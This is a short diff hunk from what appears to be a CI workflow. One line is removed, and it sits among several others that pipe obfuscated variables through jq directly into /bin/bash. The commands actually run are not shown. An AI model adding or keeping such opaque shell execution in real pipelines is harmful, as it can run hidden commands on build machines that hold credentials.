@@ -31,7 +31,6 @@ jobs:
           echo $cmyuy4 | jq -r .pnfav80256 | /bin/bash
           echo $mws35 | jq -r .i071 | /bin/bash
           printf '%s' "$j316" | jq -r .gex6789 | /bin/bash
-          echo $yrp5 | jq -r .depiy42 | /bin/bash
           echo $gnc30 | jq -r .zc47 | /bin/bash
           echo $ght72 | jq -r .ob86 | /bin/bash
           echo $d610 | jq -r .qtuid7337 | /bin/bash
